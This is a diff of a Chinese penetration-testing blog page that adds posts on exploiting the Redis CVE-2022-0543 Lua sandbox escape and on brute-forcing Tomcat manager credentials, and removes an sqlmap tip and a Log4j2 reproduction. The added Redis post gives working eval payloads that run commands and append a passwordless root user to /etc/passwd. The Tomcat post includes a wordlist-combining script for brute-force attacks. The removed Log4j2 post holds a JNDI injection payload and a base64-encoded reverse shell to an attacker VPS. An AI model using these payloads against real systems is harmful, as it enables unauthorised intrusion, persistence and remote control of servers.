@@ -200,6 +200,199 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/30/Redis-CVE-2022-0543-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/30/Redis-CVE-2022-0543-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">Redis:CVE-2022-0543-Lua沙盒绕过</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-30 23:31:58" itemprop="dateCreated datePublished" datetime="2022-06-30T23:31:58+08:00">2022-06-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2.2 &lt;= redis &lt; 5.0.13</span><br><span class="line">2.2 &lt;= redis &lt; 6.0.15</span><br><span class="line">2.2 &lt;= redis &lt; 6.2.5</span><br><span class="line">仅debian版与ubuntu版受影响</span><br><span class="line">redis存在未授权</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>redis-cli连接未授权redis数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h [ip] -p [port]</span><br></pre></td></tr></table></figure>
+
+<p>执行如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;uname -a&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);</span><br><span class="line">local io = io_l();</span><br><span class="line">local f = io.popen(&quot;id&quot;, &quot;r&quot;);</span><br><span class="line">local res = f:read(&quot;*a&quot;);</span><br><span class="line">f:close();</span><br><span class="line">return res</span><br></pre></td></tr></table></figure>
+
+<p>通过这个思路，还可以利用获得的io库往&#x2F;etc&#x2F;passwd写一个无密码root用户rootx，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);</span><br><span class="line">local io = io_l();</span><br><span class="line">local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;)</span><br><span class="line">file:write(&quot;rootx::0:0::/root:/bin/bash\n&quot;)</span><br><span class="line">file:close()</span><br></pre></td></tr></table></figure>
+
+<p>封装成redis命令行执行的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;);file:write(&quot;rootx::0:0::/root:/bin/bash\n&quot;);file:close(); return 0&#x27; 0</span><br></pre></td></tr></table></figure>
+
+<p>还可以利用网上的自动化工具自动检测</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/aodsec/CVE-2022-0543">https://github.com/aodsec/CVE-2022-0543</a></p>
+<p>利用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2022-0543.py</span><br><span class="line">命令行&gt;&gt;127.0.0.1</span><br><span class="line">命令行&gt;&gt;6379</span><br><span class="line">命令行&gt;&gt;whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，升级redis软件包到更高版本，或在 Lua 初始化的末尾添加package&#x3D;nil</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189735.html">https://www.cnblogs.com/h0cksr/p/16189735.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">Tomcat:口令可爆破</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-29 14:53:22" itemprop="dateCreated datePublished" datetime="2022-06-29T14:53:22+08:00">2022-06-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-18 17:22:35" itemprop="dateModified" datetime="2022-07-18T17:22:35+08:00">2022-07-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>&#x2F;manager&#x2F;html登录界面抓包，观察有Authorization: Basic YWRtaW46YWRtaW4&#x3D;等样式字符，解码base64字符串可得到  用户名:密码  格式字符串。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用脚本把弱用户名（tomcat必须带上），弱密码以   用户名:密码   的方式组合在一起，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat:tomcat</span><br><span class="line">tomcat:123456</span><br><span class="line">admin:123456</span><br></pre></td></tr></table></figure>
+
+<p>组合脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 字典处理，把字典处理成 user:password 的格式</span><br><span class="line">def dictHandle(userFile, passFile):</span><br><span class="line">    with open(&#x27;dict_new.txt&#x27;, &#x27;w&#x27;) as new:</span><br><span class="line">        with open(userFile, &#x27;r&#x27;) as user:</span><br><span class="line">            for u in user:</span><br><span class="line">                u = u.rstrip(&#x27;\n&#x27;)</span><br><span class="line">                print(u)</span><br><span class="line">                with open(passFile, &#x27;r&#x27;) as passwd:</span><br><span class="line">                    for p in passwd:</span><br><span class="line">                        new.write(u+&#x27;:&#x27;+p)</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主函数，接收userFile和passFile参数</span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;dictHandle [user] and [pass] to [user:pass].&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--userFile&#x27;, help=&#x27;user file&#x27;, required=True)</span><br><span class="line">    parser.add_argument(&#x27;--passFile&#x27;, help=&#x27;pass file&#x27;, required=True)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    dictHandle(args.userFile, args.passFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>将组合好的字典文本，导入burp中爆破，并对每条字符串附加base64加密设置。</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150416660.png" alt="image-20220629150416660"></p>
+<p>设置自动base64加密</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150631620.png" alt="image-20220629150631620"></p>
+<p>爆破效果如图</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629151735862.png" alt="image-20220629151735862"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/28/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%90%8E%E9%97%A8%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -970,198 +1163,6 @@ Apache Tomcat 6.x
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/%E8%AE%B0sqlmap-r%E5%8F%82%E6%95%B0%E6%B5%8B%E8%AF%95https%E8%AF%B7%E6%B1%82%E5%8C%85%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/25/%E8%AE%B0sqlmap-r%E5%8F%82%E6%95%B0%E6%B5%8B%E8%AF%95https%E8%AF%B7%E6%B1%82%E5%8C%85%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/" class="post-title-link" itemprop="url">记sqlmap -r参数测试https请求包时遇到的坑</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-25 19:13:30" itemprop="dateCreated datePublished" datetime="2022-04-25T19:13:30+08:00">2022-04-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:37" itemprop="dateModified" datetime="2022-07-16T22:52:37+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/" itemprop="url" rel="index"><span itemprop="name">1.杂七杂八</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/1-%E9%82%A3%E4%BA%9B%E5%B9%B4%E7%88%AC%E8%BF%87%E7%9A%84%E5%9D%91/" itemprop="url" rel="index"><span itemprop="name">1.那些年爬过的坑</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>测试https请求包的时候，使用命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r post1.txt</span><br></pre></td></tr></table></figure>
-
-<p>结果却始终提示timeout，查了一段时间才知道，由于Burp请求包中host是不带端口，一般区分是端口或者协议，都是使用上面的设置，如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220425191652190.png" alt="image-20220425191652190"></p>
-<p>所以光一个数据包交给sqlmap,sqlmap是不知道这个包是什么协议，以及是走什么端口的，所以就需要手工添加端口，而且如果是https，还要给sqlmap命令中加一个–force-ssl才行，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r post1.txt --force-ssl</span><br></pre></td></tr></table></figure>
-
-<p>其他端口的情况下可以这样：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220425192154962.png" alt="image-20220425192154962"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">log4j2复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-24 18:32:39" itemprop="dateCreated datePublished" datetime="2022-04-24T18:32:39+08:00">2022-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-22 10:05:04" itemprop="dateModified" datetime="2022-07-22T10:05:04+08:00">2022-07-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43795682/article/details/123557217">https://blog.csdn.net/weixin_43795682/article/details/123557217</a></p>
-<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>docker pull vulfocus&#x2F;log4j2-rce-2021-12-09:latest	&#x2F;&#x2F;docker拉漏洞环境</p>
-<p>docker run -p  8080:8080 -d –name log4j2-rce  vulfocus&#x2F;log4j2-rce-2021-12-09	&#x2F;&#x2F;运行环境，映射到主机8080端口</p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://wdhcrj.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%83release%E4%B8%AD%E7%9A%84%E7%8E%B0%E6%88%90jar%EF%BC%8C%E5%BD%93%E7%84%B6%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E3%80%82">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md工具，下载它release中的现成jar，当然自己编译也可以。</a></p>
-<p>把JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar拖到VPS，使用以下命令，构建JNDI环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>其中YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE&#x3D;是base64加密后的反弹shell命令，解密为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/432 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>以上命令的功能是反弹一个shell到VPS的432端口。</p>
-<p>由于JNDI环境需要用到8180、1099、1389这3个端口，所以要确保VPS上这3个端口未被占用，并且在云防火墙上开放这3个端口限制。</p>
-<p>JNDI命令执行后，效果如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424195833352.png" alt="image-20220424195833352"></p>
-<p>最后，VPS上监听432端口。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 432</span><br></pre></td></tr></table></figure>
-
-<p>使用上图中只有一行的链接，代入如下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:rmi://xxx.xxx.xxx.xxx:1099/jdulim&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有时注入点在get参数上，就需要把整个payloadURL编码，如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424200438345.png" alt="image-20220424200438345"></p>
-<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><p>使用burp插件</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p>
-<p>下载jar包后，导入到burpsuite扩展中，配置任意dnslog平台的api和token即可，其他保持默认</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207221004703.png" alt="image-20220722100448161"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1233,14 +1234,14 @@ Apache Tomcat 6.x
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1277,7 +1278,7 @@ Apache Tomcat 6.x
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共28k字</span>
+  <span class="post-count">博客全站共30.1k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
